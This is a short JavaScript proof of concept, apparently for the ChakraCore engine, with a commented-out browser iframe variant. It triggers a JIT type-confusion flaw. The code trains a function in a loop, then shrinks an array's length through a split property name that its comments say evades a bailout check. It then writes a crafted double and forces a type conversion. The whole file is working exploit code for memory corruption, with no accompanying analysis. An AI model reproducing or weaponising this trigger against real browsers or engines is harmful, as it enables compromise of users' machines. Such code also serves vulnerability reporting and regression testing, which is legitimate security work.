function opt(x_obj, arr) {
    arr[0] = 1.1;

    x_obj.a = arr; // Replacing the vtable.
    arr['leng' + 'th'] = 0; // The length changes, but the BailOutOnInvalidatedArrayHeadSegment check will think that it's not an array. So no bailout will happen.
    arr[0] = 2.3023e-320;
}

var cctx = WScript.LoadScript("x_obj = {}", "samethread");
//let x_obj = document.body.appendChild(document.createElement('iframe')).contentWindow.eval('({})');
let arr = [1.1, 1.1];

for (let i = 0; i < 10000; i++) {
    opt(cctx.x_obj, arr.concat());
}

opt(cctx.x_obj, arr);

arr[1] = {}; // in-place type conversion
print(arr);